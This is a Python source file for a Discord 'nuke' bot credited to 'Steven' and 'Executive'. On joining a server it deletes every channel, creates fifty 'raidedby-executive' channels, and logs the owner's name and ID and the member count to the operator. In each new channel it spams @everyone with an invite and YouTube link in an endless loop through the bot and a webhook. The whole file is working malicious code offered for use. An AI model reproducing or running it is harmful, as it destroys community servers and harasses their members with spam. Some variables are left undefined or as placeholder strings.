import discord, json, aiohttp, discord_webhook
from discord.ext import commands
from discord.ext.commands import check
import json

#Made By Steven
#Made With Love Steven & Executive
#EX ON TOP


intents = discord.Intents().all()
intents.message_content = True
bot = commands.Bot(command_prefix=".", intents=intents)
bot.remove_command('help')
session = aiohttp.ClientSession()

token = "Token bot"
antinuke = "Id Server Supaya Tidak Ke Raid"
logs_channel = "Logs Channel"

@bot.event
async def on_guild_join(guild):
    if autonuke_enabled:
        server_id = guild.id
        logg = bot.get_channel(logs_channel)

        with open('guild.json', 'r+') as f:
            data = json.load(f)
            if server_id in data['guild']:
                return
            else:
                if guild.id not in antinuke:
                    for channel in guild.channels:
                        try:
                            await channel.delete()
                        except:
                            pass

                    raid = await guild.create_text_channel(name="únete-a-dd")
                    invite = await raid.create_invite(max_age=0)
                    await raid.send("||@everyone||\nhttps://discord.gg/T57ZdQKWRs")

                    log = discord.Embed(title="Join A Server", url=invite, description=f"***Guild Info***\n> **Guild Name:** {guild.name}\n> **Guild ID:** {guild.id}\n> **Guild Boost:** {str(guild.premium_subscription_count)}\n> **Owner Name:** {guild.owner}\n> **Owner ID:** {guild.owner.id}\n> **Member Count:** {guild.member_count}", colour=0xed0b0b)
                    log.set_thumbnail(url=guild.icon_url)
                    await logg.send(embed=log)

                    for _i in range(50):
                        try:
                            await guild.create_text_channel(name="raidedby-executive")
                        except:
                            pass

                    with open('guild.json', 'r+') as f:
                        data = json.load(f)
                        data['guild'].append(server_id)
                        f.seek(0)
                        json.dump(data, f)
                        f.truncate()

@bot.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name=f"STEVENAOS")
    while True:
        embed = discord.Embed(
            description="```THIS SERVER GOT NUKED BY EX, JOIN NOW```\n\n**Discord:**\nhttps://discord.gg/T57ZdQKWRs\n**Youtube:**\nhttp://www.youtube.com/channel/UCtI7G-2932x68AiGZYrbZwwz",
            color=0x2f3136)
        embed.set_thumbnail(
            url="https://media.discordapp.net/attachments/1129013959031259257/1130515378129358918/a_8ebc61588a141afa978e5634948a769f.gif")
        embed.set_image(
            url="https://media.discordapp.net/attachments/1129013959031259257/1130514293679460433/executivegenbanner.png")
        await channel.send(content="||@everyone|| https://discord.gg/T57ZdQKWRs", embed=embed)

        webhook_embed = discord.Embed(
            description="```THIS SERVER GOT NUKED BY EX, JOIN NOW```\n\n**Discord:**\nhttps://discord.gg/T57ZdQKWRs\n**Youtube:**\nhttp://www.youtube.com/channel/UCtI7G-2932x68AiGZYrbZwwz",
            color=0x2f3136)
        webhook_embed.set_thumbnail(
            url="https://media.discordapp.net/attachments/1129013959031259257/1130515378129358918/a_8ebc61588a141afa978e5634948a769f.gif")
        webhook_embed.set_image(
            url="https://media.discordapp.net/attachments/1129013959031259257/1130514293679460433/executivegenbanner.png")
        await webhook.send(content="||@everyone|| https://discord.gg/T57ZdQKWRs", embed=webhook_embed,
                          username=f"STEVENAOS")

bot.run(token)           
